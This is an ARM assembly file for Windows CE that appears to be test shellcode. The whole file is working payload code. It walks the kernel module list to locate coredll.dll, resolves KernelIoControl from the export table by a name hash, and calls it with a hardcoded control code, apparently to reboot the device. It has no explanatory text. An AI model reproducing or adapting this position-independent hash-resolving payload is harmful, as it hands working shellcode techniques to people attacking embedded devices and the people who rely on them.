; armasm test.asm
; link /MACHINE:ARM /SUBSYSTEM:WINDOWSCE test.obj  
  
    CODE32

    EXPORT  WinMainCRTStartup

    AREA    .text, CODE, ARM

test_start

; r11 - base pointer
test_code_start   PROC
    stmdb   sp!, {r0 - r12, lr, pc}

    bl      get_export_section
    adr     r2, kc
    bl      find_func

    adr     r0, sf
    ldr     r0, [r0]
    ;ldr     r0, =0x0101003c
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    mov     lr, pc
    mov     pc, r9          ; KernelIoControl
   
    ; basic wide string compare
wstrcmp   PROC
wstrcmp_iterate
    ldrh    r2, [r0], #2
    ldrh    r3, [r1], #2

    cmp     r2, #0
    cmpeq   r3, #0
    moveq   pc, lr

    cmp     r2, r3
    beq     wstrcmp_iterate

    mov     pc, lr
    ENDP

; output:
;  r0 - coredll base addr
;  r1 - export section addr
get_export_section   PROC
    stmdb   sp!, {r4 - r9, lr}

    adr     r4, kd
    ldr     r4, [r4]
    ;ldr     r4, =0xffffc800     ; KDataStruct
    ldr     r5, =0x324          ; aInfo[KINX_MODULES]

    add     r5, r4, r5
    ldr     r5, [r5]

    ; r5 now points to first module

    mov     r6, r5
    mov     r7, #0

iterate
    ldr     r0, [r6, #8]        ; get dll name
    adr     r1, coredll
    bl      wstrcmp             ; compare with coredll.dll

    ldreq   r7, [r6, #0x7c]     ; get dll base
    ldreq   r8, [r6, #0x8c]     ; get export section rva

    add     r9, r7, r8
    beq     got_coredllbase     ; is it what we're looking for?

    ldr     r6, [r6, #4]
    cmp     r6, #0
    cmpne   r6, r5
    bne     iterate             ; nope, go on

got_coredllbase
    mov     r0, r7
    add     r1, r8, r7          ; yep, we've got imagebase
                                ; and export section pointer

    ldmia   sp!, {r4 - r9, pc}
    ENDP

coredll DCB    "c", 0x0, "o", 0x0, "r", 0x0, "e", 0x0, "d", 0x0, "l", 0x0, "l", 0x0
        DCB    ".", 0x0, "d", 0x0, "l", 0x0, "l", 0x0, 0x0, 0x0

; r0 - coredll base addr
; r1 - export section addr
; r2 - function name addr
find_func   PROC
    stmdb   sp!, {r4 - r6, lr}

    ldr     r4, [r1, #0x20]     ; AddressOfNames
    add     r4, r4, r0

    mov     r6, #0              ; counter
   
find_start
    ldr     r7, [r4], #4
    add     r7, r7, r0          ; function name ponter
    mov     r8, r2              ; find function name

    mov     r10, #0
hash_loop
    ldrb    r9, [r7], #1
    cmp     r9, #0
    beq     hash_end
    add     r10, r9, r10, ROR #7           
    b       hash_loop

hash_end
    ldr     r9, [r8]
    cmp     r10, r9 ; compare the hash
    addne   r6, r6, #1       
    bne     find_start

    ldr     r5, [r1, #0x24]     ; AddressOfNameOrdinals
    add     r5, r5, r0
    add     r6, r6, r6
    ;mov     r9, #0
    ldrh    r9, [r5, r6]        ; Ordinals
    ldr     r5, [r1, #0x1c]     ; AddressOfFunctions
    add     r5, r5, r0
    ldr     r9, [r5, r9, LSL #2]; function address rva
    add     r9, r9, r0          ; function address

    ldmia   sp!, {r4 - r6, pc}
    ENDP

kd  DCB     0x00, 0xc8, 0xff, 0xff ; 0xffffc800
sf  DCB     0x3c, 0x00, 0x01, 0x01 ; 0x0101003c
kc  DCB     0xe7, 0x9d, 0x3a, 0x28 ; KernelIoControl hash
    ALIGN   4

    LTORG
test_end

WinMainCRTStartup PROC
    b     test_code_start
    ENDP

    END
